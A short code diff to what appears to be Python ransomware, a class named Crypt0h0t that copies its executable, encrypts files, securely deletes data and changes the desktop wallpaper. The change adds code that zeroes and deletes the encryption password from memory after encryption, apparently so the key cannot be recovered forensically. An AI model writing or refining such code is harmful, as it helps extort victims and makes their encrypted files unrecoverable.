@@ -9,6 +9,7 @@ import sys
 import shutil
 import re
 import base64
+import gc
 
 import secure_delete
 from wallpaper import cambiarFondo
@@ -76,4 +77,7 @@ def main():
     r = Crypt0h0t()
     r.copiarExe()
     r.cifrarArchivos()
+    r.password = "\0" * len(r.password)
+    del r.password
+    gc.collect()
 main()
